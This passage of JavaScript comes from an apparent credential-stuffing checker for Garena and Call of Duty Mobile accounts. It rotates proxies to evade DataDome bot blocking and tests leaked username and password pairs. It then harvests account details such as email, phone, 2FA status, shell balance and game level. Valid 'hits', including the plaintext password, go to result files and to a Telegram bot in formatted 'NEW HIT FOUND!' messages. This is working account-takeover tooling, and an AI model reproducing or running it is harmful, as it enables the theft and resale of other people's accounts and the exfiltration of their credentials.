          console.warn(`[INIT] 403 on account/init attempt ${initAttempt + 1}/4`);
          const newProxy = datadomeManager.handle403(geoRotator.getCurrentProxy(), geoRotator);
          if (newProxy) await updateSessionProxy(session, newProxy);
          await new Promise(r => setTimeout(r, 20 + initAttempt * 20));
          continue;
        }

        accountData = response.data;
        break;
      } catch (e) {
        console.error(`[INIT] Error on attempt ${initAttempt + 1}:`, e.message);
        if (initAttempt === 3) {
          liveStats.recordError();
          return '🚨 IP Blocked - account/init failed after retries';
        }
      }
    }

    if (!accountData) {
      liveStats.recordError();
      return '🚨 IP Blocked - account/init failed after retries';
    }

    if (accountData.error) {
      liveStats.recordBad();
      return '';
    }

    const details = accountData.user_info
      ? parseAccountDetails(accountData)
      : parseAccountDetails({ user_info: accountData });

    // Login history
    const loginHistory = accountData.login_history || [];
    let lastLoginIp = 'N/A', lastLoginWhere = 'N/A', lastLoginTs = null;
    if (Array.isArray(loginHistory) && loginHistory.length) {
      const entry = loginHistory[0];
      if (entry) {
        lastLoginIp = entry.ip || entry.login_ip || entry.ip_address || 'N/A';
        lastLoginWhere = entry.country || entry.location || entry.region || 'N/A';
        lastLoginTs = entry.timestamp;
      }
    }

    function fmtTs(ts) {
      try {
        const d = new Date(parseInt(ts) * 1000);
        return d.toISOString().replace('T', ' ').replace('.000Z', ' UTC');
      } catch { return 'Unknown'; }
    }

    details.last_login = lastLoginTs ? fmtTs(lastLoginTs) : 'Unknown';
    details.last_login_where = lastLoginWhere;
    details.ip_for_msg = lastLoginIp;
    if (accountData.country) details.country = accountData.country;

    // ── CODM check ──────────────────────────────────────────────────
    const [hasCodm, codmInfo] = await checkCodmAccount(session);

    function isCodmInvalid(info) {
      if (!info) return true;
      if (typeof info === 'string') return info.toLowerCase().includes('error');
      if (typeof info === 'object') {
        const invalidValues = ['', 'N/A', 'NONE', 'NULL', 'ERROR'];
        if (Object.values(info).every(v => invalidValues.includes(String(v).trim().toUpperCase()))) return true;
        if (invalidValues.includes(String(info.codm_nickname || '').trim().toUpperCase())) return true;
      }
      return false;
    }

    if (!hasCodm || isCodmInvalid(codmInfo)) {
      liveStats.recordHit({ is_clean: details.is_clean, has_codm: false });

      saveCleanOrNotClean(account, password, details, hasCodm ? codmInfo : null, resultFolder);
      saveAccountDetailsFull(account, details, hasCodm ? codmInfo : null, password, resultFolder);

      // Shell balance early-send
      if (telegramConfig) {
        const shellVal = details.profile?.shell_balance || 0;
        const shellInt = parseInt(String(shellVal)) || 0;
        if (shellInt > 0) {
          const [tgToken, tgChat, , , tgCleanFilter] = telegramConfig;
          const isClean = details.is_clean || false;
          const cleanPass = (tgCleanFilter === 'both' ||
                             (tgCleanFilter === 'clean' && isClean) ||
                             (tgCleanFilter === 'notclean' && !isClean));
          if (tgToken && tgChat && cleanPass) {
            const email = details.email || 'N/A';
            const uname = details.username || account;
            const country = details.personal?.country || 'N/A';
            const mobile = details.personal?.mobile_no || 'N/A';
            const tfa = details.security?.two_step_verify ? 'Yes' : 'No';
            const auth = details.security?.authenticator_app ? 'Yes' : 'No';
            const cleanTag = isClean ? '✅ CLEAN' : '❌ NOT CLEAN';
            const evFlag = details.email_verified ? 'Verified' : 'Not Verified';
            const shellMsg =
              `💰 <b>SHELL BALANCE HIT!</b>\n` +
              `━━━━━━━━━━━━━━━━━━━━\n` +
              `👤 <b>Username:</b> <code>${uname}</code>\n` +
              `🔑 <b>Password:</b> <code>${password}</code>\n` +
              `━━━━━━━━━━━━━━━━━━━━\n` +
              `💰 <b>Garena Shell:</b> <b>${shellInt.toLocaleString()}</b> Shells\n` +
              `🎮 <b>CODM:</b> Not linked\n` +
              `━━━━━━━━━━━━━━━━━━━━\n` +
              `🔐 <b>Security</b>\n` +
              `   📧 Email: <code>${email}</code> (${evFlag})\n` +
              `   📱 Mobile Bound: ${mobile && String(mobile).trim() ? 'Yes' : 'No'}\n` +
              `   🔐 2FA: ${tfa}\n` +
              `   🛡️ Auth App: ${auth}\n` +
              `   🌍 Country: ${country}\n` +
              `   📊 Status: ${cleanTag}\n` +
              `━━━━━━━━━━━━━━━━━━━━\n` +
              `⚡ by @Yukiii_ii`;
            sendTelegramMessage(tgToken, tgChat, shellMsg);
          }
        }
      }
      return '';
    }

    // Has CODM
    const freshDd = session.defaults._cookies?.datadome;
    if (freshDd) cookieManager.saveCookie(freshDd);

    saveAccountDetailsFull(account, details, codmInfo, password, resultFolder);
    saveCleanOrNotClean(account, password, details, codmInfo, resultFolder);

    const codmLevel = parseInt(String(codmInfo?.codm_level)) || 0;
    const codmRegion = codmInfo?.region || '';
    liveStats.recordHit({
      is_clean: details.is_clean,
      has_codm: true,
      level: codmLevel,
      server: codmRegion
    });

    // ── Telegram Notification ──────────────────────────────────────
    if (telegramConfig) {
      const [tgToken, tgChat, tgThresholds, tgMention, tgCleanFilter] = telegramConfig;
      const shellVal = details.profile?.shell_balance || 0;
      const shellInt = parseInt(String(shellVal)) || 0;
      const hasShellBalance = shellInt > 0;

      const thrList = Array.isArray(tgThresholds) ? tgThresholds : [tgThresholds];
      const isClean = details.is_clean || false;
      const cleanPass = (tgCleanFilter === 'both' ||
                         (tgCleanFilter === 'clean' && isClean) ||
                         (tgCleanFilter === 'notclean' && !isClean));

      const levelPass = thrList.some(t => codmLevel >= t);
      const shouldSend = tgToken && tgChat && cleanPass && (levelPass || hasShellBalance);

      if (shouldSend) {
        const cleanTag = isClean ? '✅ CLEAN' : '❌ NOT CLEAN';
        const shellTag = hasShellBalance ? `💰 <b>${shellInt.toLocaleString()}</b> Shells` : '0 Shells';

        let hitReason;
        if (hasShellBalance && !levelPass) {
          hitReason = `💰 Shell Balance Hit (Level ${codmLevel} — bypassed threshold)`;
        } else if (hasShellBalance && levelPass) {
          hitReason = '🎯 Level + Shell Hit';
        } else {
          hitReason = '🎯 Level Hit';
        }

        const codmNickname = codmInfo?.codm_nickname || 'N/A';
        const codmUid = codmInfo?.uid || 'N/A';
        const codmRegionStr = codmInfo?.region || 'N/A';
        const email = details.email || 'N/A';
        const emailVer = details.email_verified ? 'Verified' : 'Not Verified';
        const mobile = details.personal?.mobile_no || 'N/A';
        const tfa = details.security?.two_step_verify ? 'Yes' : 'No';
        const auth = details.security?.authenticator_app ? 'Yes' : 'No';
        const accCountry = details.personal?.country || 'N/A';
        const username = details.username || account;

        const tgMsg =
          `🎯 <b>NEW HIT FOUND!</b>  [${hitReason}]\n` +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `👤 <b>Username:</b> <code>${username}</code>\n` +
          `🔑 <b>Password:</b> <code>${password}</code>\n` +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `💰 <b>Garena Shell:</b> ${shellTag}\n` +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `🎮 <b>CODM Info</b>\n` +
          `   💬 Nickname: <code>${codmNickname}</code>\n` +
          `   🔑 UID: <code>${codmUid}</code>\n` +
          `   ⭐ Level: <code>${codmLevel}</code>\n` +
          `   🌐 Region: <code>${codmRegionStr}</code>\n` +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `🔐 <b>Security</b>\n` +
          `   📧 Email: <code>${email}</code> (${emailVer})\n` +
          `   📱 Mobile Bound: ${mobile && String(mobile).trim() ? 'Yes' : 'No'}\n` +
          `   🔐 2FA: ${tfa}\n` +
          `   🛡️ Auth App: ${auth}\n` +
          `   🌍 Country: ${accCountry}\n` +
          `   📊 Status: ${cleanTag}\n` +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `⚡ by @Yukiii_ii`;

        sendTelegramMessage(tgToken, tgChat, tgMsg);
      }
    }

    return '';
  } catch (e) {
    console.error(`      💥 Unexpected error processing: ${e.message}`);
    liveStats.recordError();
    return '';
  }
}

// ── Helper to update session proxy ────────────────────────────────────
async function updateSessionProxy(session, proxyUrl) {
  if (!proxyUrl) return;
  try {
    const proto = proxyUrl.match(/^(https?|socks[45]):\/\//i);
    if (proto) {
      const scheme = proto[1].toLowerCase();
      if (scheme.startsWith('socks')) {
        const { SocksProxyAgent } = require('socks-proxy-agent');
        session.defaults.httpsAgent = new SocksProxyAgent(proxyUrl);
        session.defaults.httpAgent  = new SocksProxyAgent(proxyUrl);
      } else {
        const { HttpsProxyAgent } = require('https-proxy-agent');
        session.defaults.httpsAgent = new HttpsProxyAgent(proxyUrl);
        session.defaults.httpAgent  = new HttpsProxyAgent(proxyUrl);
      }
    }
  } catch (e) {
    console.error('[SESSION] Failed to update proxy:', e.message);
  }
}

module.exports = {
  createSession,
  applyck,
  getDatadomeCookie,
  prelogin,
  login,
  getCodmAccessToken,
  processCodmCallback,
  getCodmUserInfo,
  checkCodmAccount,
  parseAccountDetails,
  saveCodmAccount,
  saveCleanOrNotClean,
  saveAccountDetailsFull,
  processaccount,
  updateSessionProxy,
  backoff,
};
